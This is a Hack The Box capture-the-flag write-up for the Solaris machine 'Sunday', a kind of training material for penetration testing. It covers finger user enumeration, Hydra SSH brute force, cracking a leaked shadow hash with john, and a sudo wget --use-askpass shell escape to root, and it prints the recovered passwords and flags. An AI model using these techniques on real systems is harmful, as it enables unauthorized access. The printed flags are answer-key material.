---
description: https://www.hackthebox.com/machines/sunday
---

# Sunday

🔗 [Sunday](https://www.hackthebox.com/machines/sunday)

<div align="left"><figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="150"><figcaption><p>@hackthebox.com</p></figcaption></figure></div>

<details>

<summary>About</summary>

### Machine Description

Sunday is a fairly simple machine, however it uses fairly old software and can be a bit unpredictable at times. It mainly focuses on exploiting the Finger service as well as the use of weak credentials.

### Area of Interest

Enterprise Network Protocols Vulnerability Assessment Authentication

### Technology

SSH Finger

### Vulnerabilities

Weak Credentials Misconfiguration

### Security Tools

Nmap Zenmap John finger-user-enum

### Techniques

Reconnaissance User Enumeration Password Cracking Brute Force Attack SUDO Exploitation

</details>

## Task 0 - Deploy machine

🎯 Target IP: `10.129.237.18`

Create a directory on the Desktop with the machine's name, and inside this directory, create another directory to store the materials and outputs needed to run the machine, including the scans made with nmap.

## Task 1 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
<strong>echo "10.129.237.18 sunday.htb" >> /etc/hosts
</strong>
mkdir -p htb/sunday.htb
cd htb/sunday.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 sunday.htb
PING sunday.htb (10.129.237.18) 56(84) bytes of data.
64 bytes from sunday.htb (10.129.237.18): icmp_seq=1 ttl=254 time=53.7 ms
64 bytes from sunday.htb (10.129.237.18): icmp_seq=2 ttl=254 time=50.8 ms
64 bytes from sunday.htb (10.129.237.18): icmp_seq=3 ttl=254 time=54.7 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) isn't 64 or 128 secs. This is a little strange and googling we can see that our target is a **Solaris OS** system.

<div align="left"><figure><img src="../.gitbook/assets/image (24) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

### 1.1 - Which open TCP port is running the `finger` service?

Let's start right away with an active port scan with nmap

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv sunday.htb -oN nmap/tcp_port_scan
```

```bash
PORT      STATE SERVICE
79/tcp    open  finger
111/tcp   open  rpcbind
515/tcp   open  printer
6787/tcp  open  smc-admin
22022/tcp open  unknown
```



<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 5 open TCP ports on the machine: 79, 111, 515, 6787, 22022.

Then, we can proceed to analyze services active on open ports:

```bash
sudo nmap -sV -sC -p 79,111,515,6787,22022 sunday.htb -oN nmap/service_port_scan
```

```bash
PORT      STATE SERVICE VERSION
79/tcp    open  finger?
|_finger: No one logged on\x0D
| fingerprint-strings: 
|   GenericLines: 
|     No one logged on
|   GetRequest: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|   HTTPOptions: 
|     Login Name TTY Idle When Where
|     HTTP/1.0 ???
|     OPTIONS ???
|   Help: 
|     Login Name TTY Idle When Where
|     HELP ???
|   RTSPRequest: 
|     Login Name TTY Idle When Where
|     OPTIONS ???
|     RTSP/1.0 ???
|   SSLSessionReq, TerminalServerCookie: 
|_    Login Name TTY Idle When Where
111/tcp   open  rpcbind 2-4 (RPC #100000)
515/tcp   open  printer
6787/tcp  open  http    Apache httpd
|_http-server-header: Apache
|_http-title: 400 Bad Request
22022/tcp open  ssh     OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA)
|_  256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port79-TCP:V=7.94SVN%I=7%D=11/24%Time=6743B8CD%P=x86_64-pc-linux-gnu%r(
SF:GenericLines,12,"No\x20one\x20logged\x20on\r\n")%r(GetRequest,93,"Login
SF:\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x2
SF:0\x20\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nGET\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\?\?\?\r\n")%r(Help,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\nH
SF:ELP\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\?\?\?\r\n")%r(HTTPOptions,93,"Login\x20\x20\x20\x20\x20\x20\x20Nam
SF:e\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Wh
SF:ere\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\?\?\?\r\nHTTP/1\.0\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%r(RTSPRequest,93,"Login\x20
SF:\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x2
SF:0\x20When\x20\x20\x20\x20Where\r\n/\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nOPTIONS\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\nRTSP/1\
SF:.0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n")%
SF:r(SSLSessionReq,5D,"Login\x20\x20\x20\x20\x20\x20\x20Name\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20TTY\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20Idle\x20\x20\x20\x20When\x20\x20\x20\x20Where\r\n\x16\x03
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\?\?\?\r\n")%r(TerminalServerCookie,5D,"Login\x20\x20\x20\x20\
SF:x20\x20\x20Name\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20TTY\x20\x20\x20\x20\x20\x20\x20\x20\x20Idle\x20\x20\x20\x20When\x20
SF:\x20\x20\x20Where\r\n\x03\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\?\?\?\r\n");

```

Good, finger protocols was found, while we can see another two interesting services actives: webserver on port 6787 and OpenSSH on port 22022.

Browsing it:  [`https://sunday.htb:6787/`](https://sunday.htb:6787/solaris/login/) we see a Solaris login page:

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Login bypass unfortunaly doesn't work and we don't obtained great info via whatweb.

```bash
whatweb sunday.htb:6787
http://sunday.htb:6787 [400 Bad Request] Apache, Country[RESERVED][ZZ], HTTPServer[Apache], IP[10.129.237.18], Title[400 Bad Request], X-Frame-Options[SAMEORIGIN]
```

We can follow HTB questions that can help us to take the correct via.

Default TCP port 79 is running the finger service.

{% hint style="info" %}
79
{% endhint %}

### 1.2 - How many users can be found by enumerating the finger service? Consider only users who shows a pts?

### How finger service works?

The **Finger** program/service is utilized for retrieving details about computer users. Typically, the information provided includes the **user's login name, full name**, and, in some cases, additional details. These extra details could encompass the office location and phone number (if available), the time the user logged in, the period of inactivity (idle time), the last instance mail was read by the user, and the contents of the user's plan and project files.

{% embed url="https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger" %}

The best way to learn one thing is to improve yourself and develop your own tools, so I did and created the following tool in python that allows us to enumerate the users of the system using a dictionary attack with a common wordlist.

{% embed url="https://github.com/dev-angelist/Finger-User-Enumeration" %}

```bash
python3 finger_user_enumeration.py -t sunday.htb -w users.txt
```

<div align="left"><figure><img src="../.gitbook/assets/image (366).png" alt=""><figcaption></figcaption></figure></div>

excluding the root user, there are two users listed: sammy and sunny.

{% hint style="info" %}
2
{% endhint %}

## Task 2 - Find User Flag

### 2.1 - What is the password for the sunny user on Sunday?

We can use brute force tool like as Hydra to try to found sunny's password. We can do a tentative via SSH/22022 protocol.

```
hydra -l sunny -P /home/kali/Downloads/probable-v2-top1575.txt -I -f ssh://sunday.htb:22022

```

<figure><img src="../.gitbook/assets/image (367).png" alt=""><figcaption></figcaption></figure>

Fantastic, here is our password, which honestly we could have even tried to guess.

{% hint style="info" %}
sunday
{% endhint %}

### 2.2 - What is the password for user `sammy` on the box?

\
Using again Hydra we don't obtain results, then we can try to login via ssh into sunny user. &#x20;

```bash
ssh sunny@sunday.htb -p 22022
```

Here we find the folders of the two users, but without any valuable information about the password.

In sammy's folder there is the bash history, so let's try to check if there were any passwords written incorrectly in clear text.

```bash
cat ~/.bash_history | grep "password"
```

No results.

Fortunately, investigating a bit, we find in the path /backup the file shadow.backup, containing the backup of the file /etc/shadow and therefore of the hashes of the users.&#x20;

<div align="left"><figure><img src="../.gitbook/assets/image (369).png" alt=""><figcaption></figcaption></figure></div>

So we save the sammy's hash and launch john or hashcat to crack it.

```bash
echo "sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::" >> sammy_hash
```

```bash
john sammy_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../.gitbook/assets/image (370).png" alt=""><figcaption></figcaption></figure>

Well done!

{% hint style="info" %}
cooldude!
{% endhint %}

### 2.3 -  Submit the flag located in the sammy user's home directory.

Now that we also know sammy's password, we can ssh in and get the flag easily.

```bash
ssh sammy@sunday.htb -p 22022
```

```bash
cat user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

db7749ca1b003cf371c1f2afed38f834

</details>

## Task 3 - Find root flag

### 3.1 - What is the full path of the binary that user sunny can run with sudo privileges?

Executing `sudo -l` command we can commands that user puma can execute with sudo privileges:

<div align="left"><figure><img src="../.gitbook/assets/image (372).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
/root/troll
{% endhint %}

### 3.2 - What is the complete path of the binary that user sammy can run with sudo privileges?

Same thing, `sudo -l` command and it's done!

<div align="left"><figure><img src="../.gitbook/assets/image (371).png" alt=""><figcaption></figcaption></figure></div>

{% hint style="info" %}
/usr/bin/wget
{% endhint %}

### 3.3 - Submit the flag located in root's home directory.

The previous two tasks are the prelude to privilege escalation, let's checking them!

#### sammy

* /root/troll

Not knowing "troll" which I imagine is an ironic name, we focus on the usual wget.

#### sunny

* /usr/bin/wget

As always, the wget bible has a solution for privilege escalation with sudo.

```bash
TF=$(mktemp)
chmod +x $TF
echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
sudo wget --use-askpass=$TF 0
```

{% embed url="https://gtfobins.github.io/gtfobins/wget/" %}

<div align="left"><figure><img src="../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure></div>

```
cat /root/root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

c4fc01d4944cf3925f079da70abdaea7

</details>

<figure><img src="../.gitbook/assets/image (373).png" alt=""><figcaption></figcaption></figure>
